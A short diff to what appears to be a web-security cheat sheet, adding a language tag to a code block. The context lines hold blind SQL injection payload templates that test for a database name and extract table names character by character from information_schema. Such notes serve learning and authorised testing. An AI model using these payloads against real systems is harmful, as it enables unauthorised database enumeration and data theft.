@@ -359,7 +359,7 @@ reference: [https://portswigger.net/web-security/sql-injection/examining-the-dat
 
 ## Blind SQL Injection
 
-~~~
+~~~ sql
 if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
 LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
 SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
